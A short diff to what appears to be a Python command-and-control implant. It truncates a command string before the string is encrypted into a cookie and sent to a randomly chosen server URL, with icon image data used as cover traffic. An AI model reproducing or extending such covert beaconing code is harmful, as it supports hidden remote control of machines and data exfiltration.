@@ -242,6 +242,8 @@ while(True):
                 
             server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
             opener = urllib2.build_opener()
+            if (len(cmd) > 200):
+              cmd = cmd[0:200]
             postcookie = encrypt(key, cmd)
             data = base64.b64decode(random.choice(icoimage))
             dataimage = data.ljust( 1500, '\\0' )
